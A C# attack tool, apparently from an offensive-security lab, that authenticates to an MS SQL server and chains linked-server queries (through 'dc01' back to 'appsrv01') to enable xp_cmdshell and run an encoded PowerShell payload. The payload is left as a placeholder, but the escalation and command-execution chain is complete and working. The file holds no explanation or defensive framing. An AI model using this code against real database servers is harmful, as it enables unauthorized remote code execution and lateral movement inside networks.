using System;
using System.Data.SqlClient;

namespace linkenum
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";

            //The default database in MS SQL is called “master”
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String enableadvoptions = "EXEC ('EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01";
            String enableexpcmdshell = "EXEC ('EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01";
            String execmd = "EXEC ('EXEC (''xp_cmdshell ''''powershell -enc BASE64ENCODED PAYLOAD HERE'''''') AT appsrv01') AT dc01";

            //enable advanced options on appsrv01
            SqlCommand command = new SqlCommand(enableadvoptions, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            //enable xp_cmdshell on appsrv01
            command = new SqlCommand(enableexpcmdshell, con);
            reader = command.ExecuteReader();
            reader.Close();


            //run powershell one liner on appsrv01
            command = new SqlCommand(execmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();


        }